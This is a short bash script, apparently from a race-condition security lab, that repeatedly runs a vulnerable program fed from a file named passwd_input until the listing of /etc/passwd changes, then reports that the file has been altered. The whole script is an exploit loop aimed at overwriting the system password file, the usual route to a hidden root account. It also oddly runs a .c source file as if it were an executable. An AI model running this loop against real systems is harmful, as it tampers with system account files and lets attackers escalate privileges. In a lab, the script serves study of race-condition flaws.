#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
OLD=$($CHECK_FILE)
NEW=$($CHECK_FILE)

while [[ "$OLD" == "$NEW" ]]
do
    ./vulnerableRaceConditionProgram.c < passwd_input
    NEW=$($CHECK_FILE)
done

echo "/etc/passwd file has been altared!"
